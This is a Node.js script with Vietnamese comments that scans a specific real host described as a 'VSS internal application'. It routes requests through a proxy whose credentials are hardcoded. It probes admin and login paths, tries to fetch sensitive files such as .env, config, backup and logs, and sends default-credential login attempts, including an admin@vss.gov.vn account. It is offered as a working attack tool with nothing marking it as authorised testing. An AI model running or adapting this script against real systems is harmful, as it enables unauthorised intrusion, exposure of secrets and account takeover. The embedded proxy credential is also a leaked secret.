const axios = require('axios');
const { HttpProxyAgent } = require('http-proxy-agent');

// Proxy configuration 
const proxyUrl = 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301';
const baseUrl = 'http://vssapp.teca.vn:8088';

console.log('🔍 KHÁM PHÁ SÂU VSS INTERNAL APPLICATION');
console.log(`🎯 Target: ${baseUrl}`);
console.log('=' * 60);

// Tạo client với proxy và cookies
function createClient() {
  return axios.create({
    httpAgent: new HttpProxyAgent(proxyUrl),
    timeout: 10000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    }
  });
}

// Khám phá cấu trúc ứng dụng Laravel
async function exploreApplication() {
  const client = createClient();
  
  console.log('\n🔍 1. PHÂN TÍCH TRANG CHÍNH');
  console.log('─'.repeat(50));
  
  try {
    const response = await client.get(baseUrl);
    const html = response.data;
    
    console.log('✅ Đã lấy được trang chính');
    
    // Extract thông tin từ HTML
    const titleMatch = html.match(/<title>(.*?)<\/title>/i);
    const title = titleMatch ? titleMatch[1] : 'Không có title';
    console.log(`📄 Title: ${title}`);
    
    // Tìm links và forms
    const links = html.match(/href=["']([^"']+)["']/g) || [];
    const forms = html.match(/<form[^>]*>/g) || [];
    const scripts = html.match(/src=["']([^"']*\.js[^"']*)["']/g) || [];
    const cssFiles = html.match(/href=["']([^"']*\.css[^"']*)["']/g) || [];
    
    console.log(`🔗 Số lượng links: ${links.length}`);
    console.log(`📝 Số lượng forms: ${forms.length}`);
    console.log(`📜 Số file JS: ${scripts.length}`);
    console.log(`🎨 Số file CSS: ${cssFiles.length}`);
    
    // Hiển thị một số links quan trọng
    const importantLinks = links
      .map(link => link.match(/href=["']([^"']+)["']/)[1])
      .filter(href => 
        href.includes('login') || 
        href.includes('admin') || 
        href.includes('api') || 
        href.includes('auth') ||
        href.includes('dashboard') ||
        href.includes('user')
      )
      .slice(0, 10);
    
    if (importantLinks.length > 0) {
      console.log('\n🎯 Links quan trọng tìm thấy:');
      importantLinks.forEach(link => console.log(`   ${link}`));
    }
    
    // Lưu cookies để sử dụng tiếp
    const cookies = response.headers['set-cookie'];
    if (cookies) {
      console.log('\n🍪 Cookies nhận được:');
      cookies.forEach(cookie => {
        const cookieName = cookie.split('=')[0];
        console.log(`   ${cookieName}`);
      });
      
      // Cập nhật headers cho requests tiếp theo
      const cookieHeader = cookies.map(c => c.split(';')[0]).join('; ');
      client.defaults.headers.Cookie = cookieHeader;
      console.log('✅ Đã lưu cookies cho session');
    }
    
    return { client, html };
    
  } catch (error) {
    console.log(`❌ Lỗi: ${error.message}`);
    return null;
  }
}

// Thử truy cập các đường dẫn Laravel phổ biến
async function testCommonPaths(client) {
  console.log('\n🔍 2. TEST CÁC ĐƯỜNG DẪN PHỔ BIẾN');
  console.log('─'.repeat(50));
  
  const commonPaths = [
    '/login',
    '/admin',
    '/admin/login', 
    '/dashboard',
    '/home',
    '/api',
    '/api/user',
    '/user',
    '/profile',
    '/auth/login',
    '/laravel',
    '/public',
    '/storage',
    '/routes',
    '/logout',
    '/register',
    '/password/reset'
  ];
  
  const foundPaths = [];
  
  for (let path of commonPaths) {
    try {
      console.log(`   Testing: ${path}`);
      const response = await client.get(baseUrl + path);
      
      if (response.status === 200) {
        console.log(`   ✅ ${path} - OK (${response.data.length} chars)`);
        foundPaths.push({
          path: path,
          status: 200,
          contentType: response.headers['content-type'],
          length: response.data.length,
          title: extractTitle(response.data)
        });
      } else {
        console.log(`   ⚠️ ${path} - ${response.status}`);
      }
      
    } catch (error) {
      const status = error.response?.status || 'ERROR';
      if (status === 302 || status === 301) {
        const location = error.response.headers.location;
        console.log(`   🔀 ${path} - Redirect to: ${location}`);
        foundPaths.push({
          path: path,
          status: status,
          redirect: location
        });
      } else if (status !== 404) {
        console.log(`   ❌ ${path} - ${status}`);
      }
    }
    
    // Delay nhỏ để tránh spam
    await new Promise(resolve => setTimeout(resolve, 200));
  }
  
  return foundPaths;
}

// Thử brute force subdirectories/files
async function bruteForceDirectories(client) {
  console.log('\n🔍 3. BRUTE FORCE DIRECTORIES');
  console.log('─'.repeat(50));
  
  const directories = [
    'app', 'config', 'database', 'public', 'resources', 'routes', 'storage',
    'vendor', 'bootstrap', 'artisan', '.env', 'composer.json', 'package.json',
    'web.php', 'api.php', 'channels.php', 'console.php',
    'uploads', 'files', 'images', 'css', 'js', 'fonts',
    'backup', 'logs', 'cache', 'sessions'
  ];
  
  const found = [];
  
  for (let dir of directories) {
    try {
      const response = await client.get(`${baseUrl}/${dir}`);
      console.log(`   ✅ /${dir} - Found! (${response.status})`);
      found.push(dir);
    } catch (error) {
      if (error.response?.status === 403) {
        console.log(`   🔒 /${dir} - Forbidden (exists but protected)`);
        found.push(`${dir} (403)`);
      }
      // Ignore 404s
    }
    
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  return found;
}

// Helper function
function extractTitle(html) {
  const match = html.match(/<title>(.*?)<\/title>/i);
  return match ? match[1].trim() : 'No title';
}

// Test POST requests (login attempts, API calls)
async function testPOSTEndpoints(client) {
  console.log('\n🔍 4. TEST POST ENDPOINTS');
  console.log('─'.repeat(50));
  
  const postEndpoints = [
    { path: '/login', data: { email: 'admin@vss.gov.vn', password: 'admin123' } },
    { path: '/auth/login', data: { username: 'admin', password: 'admin' } },
    { path: '/api/auth', data: { user: 'test', pass: 'test' } },
    { path: '/api/login', data: { email: 'test@test.com', password: 'test' } }
  ];
  
  for (let endpoint of postEndpoints) {
    try {
      console.log(`   POST to: ${endpoint.path}`);
      const response = await client.post(baseUrl + endpoint.path, endpoint.data);
      console.log(`   ✅ ${endpoint.path} - ${response.status}`);
      
      if (response.data) {
        const preview = JSON.stringify(response.data).substring(0, 100);
        console.log(`      Data: ${preview}...`);
      }
    } catch (error) {
      const status = error.response?.status || 'ERROR';
      console.log(`   ❌ ${endpoint.path} - ${status}`);
      
      if (error.response?.data) {
        const errorData = JSON.stringify(error.response.data).substring(0, 100);
        console.log(`      Error: ${errorData}...`);
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 300));
  }
}

// Main execution
async function main() {
  try {
    // Step 1: Phân tích trang chính
    const result = await exploreApplication();
    if (!result) {
      console.log('❌ Không thể khởi tạo. Dừng chương trình.');
      return;
    }
    
    const { client } = result;
    
    // Step 2: Test common paths
    const foundPaths = await testCommonPaths(client);
    
    // Step 3: Brute force directories
    const foundDirs = await bruteForceDirectories(client);
    
    // Step 4: Test POST endpoints
    await testPOSTEndpoints(client);
    
    // Summary
    console.log('\n📊 TỔNG KẾT KẾT QUẢ');
    console.log('=' * 60);
    console.log(`✅ Paths tìm thấy: ${foundPaths.length}`);
    console.log(`📁 Directories tìm thấy: ${foundDirs.length}`);
    
    if (foundPaths.length > 0) {
      console.log('\n🎯 PATHS QUAN TRỌNG:');
      foundPaths.forEach(item => {
        if (item.redirect) {
          console.log(`   ${item.path} -> ${item.redirect}`);
        } else {
          console.log(`   ${item.path} (${item.title || 'No title'})`);
        }
      });
    }
    
    if (foundDirs.length > 0) {
      console.log('\n📁 DIRECTORIES TÌM THẤY:');
      foundDirs.forEach(dir => console.log(`   /${dir}`));
    }
    
    console.log('\n🎉 HOÀN THÀNH KHÁM PHÁ VSS INTERNAL APP!');
    
  } catch (error) {
    console.error('💥 Lỗi tổng thể:', error.message);
  }
}

main();